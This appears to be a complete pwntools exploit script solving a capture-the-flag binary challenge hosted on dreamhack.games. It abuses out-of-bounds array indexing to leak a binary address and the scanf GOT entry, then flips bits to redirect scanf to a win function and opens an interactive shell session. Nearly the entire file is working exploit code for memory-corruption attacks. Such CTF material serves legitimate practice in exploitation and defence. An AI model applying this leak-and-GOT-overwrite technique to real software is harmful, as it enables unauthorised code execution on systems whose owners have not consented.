#!/usr/bin/python3

from pwn import *

exe = ELF("./main")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *main+69
        b *main+87
        b *main+107
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 17255)
else:
    p = process([exe.path])
GDB()
sla(b'> ', b'1')
payload = b'100'
payload += b'-7'
sla(b'Enter i & j > ', payload )
sla(b'> ', b'2')
sla(b'Enter i > ', b'100')
p.recvuntil(b': ')
binary_leak = int(p.recvline(), 16)
binary_base = binary_leak - 0x3488
log.info("binary leak: " + hex(binary_leak))
log.info("binary base: " + hex(binary_base))
win = binary_base + 0x13ed
log.info("win: " + hex(win))

sla(b'> ', b'1')
payload = b'101'
payload += b'-14'
sla(b'Enter i & j > ', payload )
sla(b'> ', b'2')
sla(b'Enter i > ', b'101')
p.recvuntil(b': ')
scanf_got = int(p.recvline(), 16)
log.info("scanf GOT: " + hex(scanf_got))

mask = f"{scanf_got ^ win:064b}"
print(mask)
for i in range (64):
    x = (int(mask,2) >> i) & 1
    if(x == 1):
        sla(b'> ', b'1')
        payload = b'102 '
        payload += f"{i}".encode()
        sla(b'Enter i & j > ', payload)

sla(b'> ', b'2')
sla(b'Enter i > ', b'102')
sla(b'> ', b'1')
payload = b'-14 '
payload += b'102'
sla(b'Enter i & j > ', payload )
sla(b'> ', b'2')

p.interactive()

